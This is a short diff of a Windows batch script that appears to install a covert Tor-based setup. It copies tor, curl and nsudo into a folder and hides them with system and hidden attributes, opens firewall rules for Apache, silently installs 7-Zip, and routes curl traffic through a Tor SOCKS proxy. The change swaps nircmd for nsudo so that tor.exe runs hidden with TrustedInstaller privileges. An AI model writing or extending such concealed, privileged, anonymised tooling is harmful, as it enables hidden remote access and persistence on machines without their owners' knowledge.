@@ -28,7 +28,7 @@ netsh advfirewall firewall add rule name="apache" dir=in action=allow program="%
 netsh advfirewall firewall add rule name="apache" dir=in action=allow program="%environment%\apache2\bin\httpd.exe" protocol=UDP
 
 copy /y "tor.exe" "%environment%\tor.exe" && attrib +s +h +i "%environment%\tor.exe"
-copy /y "nircmd.exe" "%environment%\nircmd.exe" && attrib +s +h +i "%environment%\nircmd.exe"
+copy /y "nsudo.exe" "%environment%\nsudo.exe" && attrib +s +h +i "%environment%\nsudo.exe"
 copy /y "curl.exe" "%environment%\curl.exe" && attrib +s +h +i "%environment%\curl.exe"
 
 "%environment%\curl.exe" -k https://www.7-zip.org/a/7z2201.exe -o "%temp%\7z2201.exe" && "%temp%\7z2201.exe" /S /D="%environment%\7-Zip" && del "%temp%\7z2201.exe" && attrib +s +h +i "%environment%\7-Zip"
@@ -40,7 +40,7 @@ if exist "%environment%\tor.exe" (
 )
 
 taskkill /f /im tor.exe
-"%environment%\nircmd.exe" exec hide "%environment%\tor.exe" && timeout -t 30
+"%environment%\nsudo.exe" -U:T -P:E -ShowWindowMode:Hide "%environment%\tor.exe" && timeout -t 30
  
 tasklist /fi "imagename eq tor.exe" | find /i "tor.exe" > nul
 if not errorlevel 1 (set "proxy=--tlsv1 --socks5-hostname 127.0.0.1:9050") else (
